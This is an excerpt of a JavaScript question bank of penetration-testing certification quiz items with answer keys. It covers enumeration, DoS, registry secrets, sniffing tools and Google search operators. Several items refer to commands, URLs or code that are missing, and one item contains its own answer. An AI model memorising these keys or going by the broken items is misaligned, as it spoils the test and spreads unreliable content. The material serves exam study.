      "D. src port 22 and dst port 22",
    ],
    correctAnswer: 3,
  },
  {
    id: 939,
    question:
      "Which feature will you disable to eliminate the ability to enumerate information about your Cisco routers?",
    options: [
      "A. Border Gateway Protocol",
      "B. Cisco Discovery Protocol",
      "C. Broadcast System Protocol",
      "D. Simple Network Management Protocol",
    ],
    correctAnswer: 1,
  },
  {
    id: 940,
    question: "What is the smallest possible shellcode in Linux?",
    options: ["A. 24 bytes", "B. 8 bytes", "C. 800 bytes", "D. 80 bytes"],
    correctAnswer: 0,
  },
  {
    id: 941,
    question:
      "What kind of results did Jim receive from his vulnerability analysis when exploits were executed on systems deemed not exploitable?",
    options: [
      "A. False negatives",
      "B. False positives",
      "C. True negatives",
      "D. True positives",
    ],
    correctAnswer: 0,
  },
  {
    id: 942,
    question:
      "Why would you want to initiate a DoS attack on a system you are testing as a penetration tester?",
    options: [
      "A. Show outdated equipment so it can be replaced",
      "B. List weak points on their network",
      "C. Use attack as a launching point to penetrate deeper into the network",
      "D. Demonstrate that no system can be protected against DoS attacks",
    ],
    correctAnswer: 1,
  },
  {
    id: 943,
    question:
      "Why are Linux/Unix based computers better to use than Windows computers for idle scanning?",
    options: [
      "A. Linux/Unix computers are easier to compromise",
      "B. Linux/Unix computers are constantly talking",
      "C. Windows computers are constantly talking",
      "D. Windows computers will not respond to idle scans",
    ],
    correctAnswer: 2,
  },
  {
    id: 944,
    question: "What operating system would respond to the following command?",
    options: ["A. Windows 95", "B. FreeBSD", "C. Windows XP", "D. Mac OS X"],
    correctAnswer: 1,
  },
  {
    id: 945,
    question:
      "What type of attack has the technician performed when they follow employees into restricted areas disguised as an electrician?",
    options: [
      "A. Tailgating",
      "B. Backtrapping",
      "C. Man trap attack",
      "D. Fuzzing",
    ],
    correctAnswer: 0,
  },
  {
    id: 946,
    question:
      "What changes should the client company make based on the screenshot presented by Paulette during the audit?",
    options: [
      "A. Remove any identifying numbers, names, or version information",
      "B. The banner should have more detail on the version numbers for the network equipment",
      "C. The banner should not state 'only authorized IT personnel may proceed'",
      "D. The banner should include the Cisco tech support contact information as well",
    ],
    correctAnswer: 0,
  },
  {
    id: 948,
    question:
      "What will the following URL produce in an unpatched IIS Web Server?",
    options: [
      "A. Directory listing of C: drive on the web server",
      "B. Insert a Trojan horse into the C: drive of the web server",
      "C. Execute a buffer flow in the C: drive of the web server",
      "D. Directory listing of the C:\\windows\\system32 folder on the web server",
    ],
    correctAnswer: 0,
  },
  {
    id: 949,
    question:
      "What is kept in the following directory? HKLM\\SECURITY\\Policy\\Secrets",
    options: [
      "A. Cached password hashes for the past 20 users",
      "B. Service account passwords in plain text",
      "C. IAS account names and passwords",
      "D. Local store PKI Kerberos certificates",
    ],
    correctAnswer: 1,
  },
  {
    id: 950,
    question:
      "Where should Harold navigate on the computer to find the backup SAM file after running rdisk /s command?",
    options: [
      "A. %systemroot%\\system32\\LSA",
      "B. %systemroot%\\system32\\drivers\\etc",
      "C. %systemroot%\\repair",
      "D. %systemroot%\\LSA",
    ],
    correctAnswer: 2,
  },
  {
    id: 951,
    question:
      "What search string will you use to locate Microsoft Outlook Web Access Default Portal using Google search?",
    options: [
      'A. allinurl:"exchange/logon.asp"',
      'B. intitle:"exchange server"',
      'C. locate:"logon page"',
      'D. outlook:"search"',
    ],
    correctAnswer: 0,
  },
  {
    id: 952,
    question:
      "When setting up a wireless network with multiple access points, why is it important to set each access point on a different channel?",
    options: [
      "A. Multiple access points can be set up on the same channel without any issues",
      "B. Avoid over-saturation of wireless signals",
      "C. So that the access points will work on different frequencies",
      "D. Avoid cross talk",
    ],
    correctAnswer: 3,
  },
  {
    id: 953,
    question:
      "After normal working hours, you initiate a DoS attack against your external firewall and then initiate an FTP connection from an external IP. The FTP connection is successful even though FTP is blocked at the external firewall. What has happened?",
    options: [
      "A. The firewall failed-bypass",
      "B. The firewall failed-closed",
      "C. The firewall ACL has been purged",
      "D. The firewall failed-open",
    ],
    correctAnswer: 3,
  },
  {
    id: 954,
    question:
      "How would you answer if asked about the methodology you will be using to test the company's network after passing your ECSA exam?",
    options: [
      "A. Microsoft Methodology",
      "B. Google Methodology",
      "C. IBM Methodology",
      "D. LPT Methodology",
    ],
    correctAnswer: 3,
  },
  {
    id: 955,
    question:
      "After passing her CEH exam, Carol wants to ensure that her network is completely secure. She implements a DMZ, statefull firewall, NAT, IPSEC, and a packet filtering firewall. Since all security measures were taken, none of the hosts on her network can reach the Internet. Why is that?",
    options: [
      "A. Statefull firewalls do not work with packet filtering firewalls",
      "B. NAT does not work with statefull firewalls",
      "C. IPSEC does not work with packet filtering firewalls",
      "D. NAT does not work with IPSEC",
    ],
    correctAnswer: 3,
  },
  {
    id: 956,
    question:
      "Jason has set up a honeypot environment by creating a DMZ that has no physical or logical access to his production network. In this honeypot, he has placed a server running Windows Active Directory. He has also placed a Web server in the DMZ that services a number of web pages that offer visitors a chance to download sensitive information by clicking on a button. A week later, Jason finds in his network logs how an intruder accessed the honeypot and downloaded sensitive information. Why will this not be viable to prosecute the intruder?",
    options: [
      "A. Entrapment",
      "B. Enticement",
      "C. Intruding into a honeypot is not illegal",
      "D. Intruding into a DMZ is not illegal",
    ],
    correctAnswer: 0,
  },
  {
    id: 957,
    question:
      "You have compromised a lower-level administrator account on an Active Directory network of a small company. You discover Domain Controllers through enumeration. You connect to one of the Domain Controllers on port 389 using ldp.exe. What are you trying to accomplish here?",
    options: [
      "A. Poison the DNS records with false records",
      "B. Enumerate MX and A records from DNS",
      "C. Establish a remote connection to the Domain Controller",
      "D. Enumerate domain user accounts and built-in groups",
    ],
    correctAnswer: 3,
  },
  {
    id: 958,
    question:
      "What are the security risks of running a 'repair' installation for Windows XP?",
    options: [
      "A. Pressing Shift+F10 gives the user administrative rights",
      "B. Pressing Shift+F1 gives the user administrative rights",
      "C. Pressing Ctrl+F10 gives the user administrative rights",
      "D. There are no security risks when running the 'repair' installation for Windows XP",
    ],
    correctAnswer: 0,
  },
  {
    id: 959,
    question:
      "Terri works for a security consulting firm that is currently performing a penetration test on First National Bank in Tokyo. Terri's duties include bypassing firewalls and switches to gain access to the network. Terri sends an IP packet to one of the company's switches with ACK bit and the source address of her machine set. What is Terri trying to accomplish by sending this IP packet?",
    options: [
      "A. Trick the switch into thinking it already has a session with Terri's computer",
      "B. Poison the switch's MAC address table by flooding it with ACK bits",
      "C. Crash the switch with a DoS attack since switches cannot send ACK bits",
      "D. Enable tunneling feature on the switch",
    ],
    correctAnswer: 0,
  },
  {
    id: 960,
    question:
      "You are a security analyst performing reconnaissance on a company you will be carrying out a penetration test for. You conduct a search for IT jobs on Dice.com and find the following information for an open position: 7+ years experience in Windows Server environment, 5+ years experience in Exchange 2000/2003 environment, Experience with Cisco Pix Firewall, Linksys 1376 router, Oracle 11i, and MYOB v3.4 Accounting software are required. MCSA desired, MCSE, CEH preferred. What is this information posted on the job website considered?",
    options: [
      "A. Social engineering exploit",
      "B. Competitive exploit",
      "C. Information vulnerability",
      "D. Trade secret",
    ],
    correctAnswer: 2,
  },
  {
    id: 961,
    question:
      "The objective of this act was to protect consumers' personal financial information held by financial institutions and their service providers.",
    options: [
      "A. Gramm-Leach-Bliley Act",
      "B. Sarbanes-Oxley 2002",
      "C. California SB 1386",
      "D. HIPAA",
    ],
    correctAnswer: 0,
  },
  {
    id: 962,
    question:
      "Why is it a good idea to perform a penetration test from the inside?",
    options: [
      "A. It is never a good idea to perform a penetration test from the inside",
      "B. Because 70% of attacks are from inside the organization",
      "C. To attack a network from a hacker's perspective",
      "D. It is easier to hack from the inside",
    ],
    correctAnswer: 1,
  },
  {
    id: 963,
    question:
      "Harold is a web designer who has completed a website for ghttech.net. As part of the maintenance agreement he signed with the client, Harold is performing research online and seeing how much exposure the site has received so far. Harold navigates to google.com and types in the following search. link:www.ghttech.net What will this search produce?",
    options: [
      "A. All sites that ghttech.net links to",
      "B. All sites that link to ghttech.net",
      "C. All search engines that link to .net domains",
      "D. Sites that contain the code: link:www.ghttech.net",
    ],
    correctAnswer: 1,
  },
  {
    id: 965,
    question:
      "A packet is sent to a router that does not have the packet destination address in its route table, how will the packet get to its proper destination address?",
    options: [
      "A. Root Internet servers",
      "B. Border Gateway Protocol",
      "C. Gateway of last resort",
      "D. Reverse DNS",
    ],
    correctAnswer: 2,
  },
  {
    id: 966,
    question:
      "James is testing the ability of his routers to withstand DoS attacks. James sends ICMP ECHO requests to the broadcast address of his network. What type of DoS attack is James testing against his network?",
    options: ["A. Smurf", "B. Trinoo", "C. Fraggle", "D. SYN flood"],
    correctAnswer: 0,
  },
  {
    id: 967,
    question:
      "Kyle is performing the final testing of an application he developed for the accounting department. His last round of testing is to ensure that the program is as secure as possible. Kyle runs the following command. What is he testing at this point?",
    options: [
      "A. Buffer overflow",
      "B. SQL injection",
      "C. Format string bug",
      "D. Kernel injection",
    ],
    correctAnswer: 0,
  },
  {
    id: 968,
    question:
      "You are running known exploits against your network to test for possible vulnerabilities. To test the strength of your virus software, you load a test network to mimic your production network. Your software successfully blocks some simple macro and encrypted viruses. You decide to really test the software by using virus code where the code rewrites itself entirely and the signatures change from child to child, but the functionality stays the same. What type of virus is this that you are testing?",
    options: [
      "A. Polymorphic",
      "B. Metamorphic",
      "C. Oligomorphic",
      "D. Transmorphic",
    ],
    correctAnswer: 1,
  },
  {
    id: 969,
    question:
      "What is a good security method to prevent unauthorized users from 'tailgating'?",
    options: [
      "A. Man trap",
      "B. Electronic combination locks",
      "C. Pick-resistant locks",
      "D. Electronic key systems",
    ],
    correctAnswer: 0,
  },
  {
    id: 970,
    question:
      "You are the security analyst working for a private company out of France. Your current assignment is to obtain credit card information from a Swiss bank owned by that company. After initial reconnaissance, you discover that the bank security defenses are very strong and would take too long to penetrate. You decide to get the information by monitoring the traffic between the bank and one of its subsidiaries in London. After monitoring some of the traffic, you see a lot of FTP packets traveling back and forth. You want to sniff the traffic and extract usernames and passwords. What tool could you use to get this information?",
    options: ["A. Airsnort", "B. Snort", "C. Ettercap", "D. RaidSniff"],
    correctAnswer: 2,
  },
  {
    id: 971,
    question:
      "As a security analyst you set up a false survey website that will require users to create a username and a strong password. You send the link to all the employees of the company. What information will you be able to gather?",
    options: [
      "A. The IP address of the employees' computers",
      "B. Bank account numbers and the corresponding routing numbers",
      "C. The employees' network usernames and passwords",
      "D. The MAC address of the employees' computers",
    ],
    correctAnswer: 2,
  },
  {
    id: 973,
    question:
      "Harold wants to set up a firewall on his network but is not sure which one would be the most appropriate. He knows he needs to allow FTP traffic to one of the servers on his network, but he wants to only allow FTP-PUT. Which firewall would be most appropriate for Harold's needs?",
    options: [
      "A. Circuit-level proxy firewall",
      "B. Packet filtering firewall",
      "C. Application-level proxy firewall",
      "D. Data link layer firewall",
    ],
    correctAnswer: 2,
  },
  {
    id: 974,
    question:
      "What will the following command accomplish? (Test ability of a router to handle over-sized packets)",
    options: [
      "A. Test ability of a router to handle over-sized packets",
      "B. Test the ability of a router to handle under-sized packets",
      "C. Test the ability of a WLAN to handle fragmented packets",
      "D. Test the ability of a router to handle fragmented packets",
    ],
    correctAnswer: 0,
  },
  {
    id: 975,
    question: "What does ICMP Type 3/Code 13 mean?",
    options: [
      "A. Host Unreachable",
      "B. Administratively Blocked",
      "C. Port Unreachable",
      "D. Protocol Unreachable",
    ],
    correctAnswer: 1,
  },
  {
    id: 978,
    question:
      "Your company's network just finished going through a SAS 70 audit. This audit reported that overall, your network is secure, but there are some areas that need improvement. The major area was SNMP security. The audit company recommended turning off SNMP, but that is not an option since you have so many remote nodes to keep track of. What step could you take to help secure SNMP on your network?",
    options: [
      "A. Block all internal MAC address from using SNMP",
      "B. Block access to UDP port 171",
      "C. Block access to TCP port 171",
      "D. Change the default community string names",
    ],
    correctAnswer: 3,
  },
  {
    id: 979,
    question:
      "After attending a CEH security seminar, you make a list of changes you would like to perform on your network to increase its security. One of the first things you change is to switch the RestrictAnonymous setting from 0 to 1 on your servers. This, as you were told, would prevent anonymous users from establishing a null session on the server. Using Userinfo tool mentioned at the seminar, you succeed in establishing a null session with one of the servers. Why is that?",
    options: [
      "A. RestrictAnonymous must be set to '10' for complete security",
      "B. RestrictAnonymous must be set to '3' for complete security",
      "C. RestrictAnonymous must be set to '2' for complete security",
      "D. There is no way to always prevent an anonymous null session from establishing",
    ],
    correctAnswer: 2,
  },
  {
    id: 980,
    question:
      "In a virtual test environment, Michael is testing the strength and security of BGP using multiple routers to mimic the backbone of the Internet. This project will help him write his doctoral thesis on 'bringing down the Internet'. Without sniffing the traffic between the routers, Michael sends millions of RESET packets to the routers in an attempt to shut one or all of them down. After a few hours, one of the routers finally shuts itself down. What will the other routers communicate between themselves?",
    options: [
      "A. The change in the routing fabric to bypass the affected router",
      "B. More RESET packets to the affected router to get it to power back up",
      "C. RESTART packets to the affected router to get it to power back up",
      "D. STOP packets to all other routers warning of where the attack originated",
    ],
    correctAnswer: 0,
  },
  {
    id: 981,
    question:
      "How many possible sequence number combinations are there in TCP/IP protocol?",
    options: [
      "A. 1 billion",
      "B. 320 billion",
      "C. 4 billion",
      "D. 32 million",
    ],
    correctAnswer: 2,
  },
  {
    id: 982,
    question:
      "Tyler is setting up a wireless network for his business that he runs out of his home. He has followed all the directions from the ISP as well as the wireless router manual. He does not have any encryption set and the SSID is being broadcast. On his laptop, he can pick up the wireless signal for short periods of time, but then the connection drops and the signal goes away. Eventually the wireless signal shows back up, but drops intermittently. What could be Tyler's issue with his home wireless network?",
    options: [
      "A. Computers on his wired network",
      "B. Satellite television",
      "C. 2.4GHz Cordless phones",
      "D. CB radio",
    ],
    correctAnswer: 2,
  },
  {
    id: 983,
    question:
      "You are working on a thesis for your doctorate degree in Computer Science. Your thesis is based on HTML, DHTML, and other web-based languages and how they have evolved over the years. You navigate to archive.org and view the HTML code of news.com. You then navigate to the current news.com website and copy over the source code. While searching through the code, you come across something abnormal: What have you found?",
    options: [
      "A. Web bug",
      "B. CGI code",
      "C. Trojan.downloader",
      "D. Blind bug",
    ],
    correctAnswer: 0,
  },
  {
    id: 984,
    question:
      "Williams, a forensic specialist, was investigating a system suspected to be involved in a cybercrime. Williams collected the required evidence, eliminated the root cause of the incident, and closed all attack vectors. In which phase of incident response did Williams perform these tasks?",
    options: [
      "Post-incident activities",
      "Incident triage",
      "Eradication",
      "Preparation for incident handling and response",
    ],
    correctAnswer: 2,
  },
  {
    id: 985,
    question:
      "If you discover a criminal act while investigating a corporate policy abuse, it becomes a publicsector investigation and should be referred to law enforcement?",
    options: ["true", "false"],
    correctAnswer: 0,
  },
];
